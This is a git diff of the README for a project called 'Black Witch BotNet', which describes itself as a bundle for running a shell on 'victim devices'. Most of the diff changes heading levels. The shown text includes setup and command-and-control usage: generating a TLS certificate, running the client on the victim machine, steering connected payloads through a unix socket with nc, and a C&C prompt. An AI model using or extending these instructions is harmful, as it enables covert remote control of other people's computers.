@@ -1,9 +1,11 @@
+<img width="150px" src="https://blackwitchcoven.com/wp-content/uploads/2017/01/ccedb1918e81e3fcaad18aca53f8da7e.jpeg">
+
 # Black Witch BotNet
+####The blank bundle to run the shell on your victim devices
 
-### The blank bundle to run the shell on your victim devices
-#### We are welkome to open issue
+We are welkome to open issue
 
-### Usage
+## Usage
 #### Generate server certificate and key
 ```
 openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout server.key -out server.crt
@@ -27,7 +29,7 @@ This will run the client on the victim machine. For now you have to compile bina
 To view all available options use -help on the server and client
 
 
-### Control
+## Control
 To manage connected payloads you may use nc or something that can connect to the unix sock
 ```
 nc -U tmp/unix.sock
@@ -56,7 +58,7 @@ Connect to connection
 <CC:#> use 0
 ```
 
-### Communicate with client payload
+## Communicate with client payload
 #### Syntax
 
 ```
@@ -167,7 +169,7 @@ ErrorUnknownShellType = 4
 ErrorUnknownEventType = 5
 ```
 
-### Production
+## Production
 #### Config server
 
 Create directory
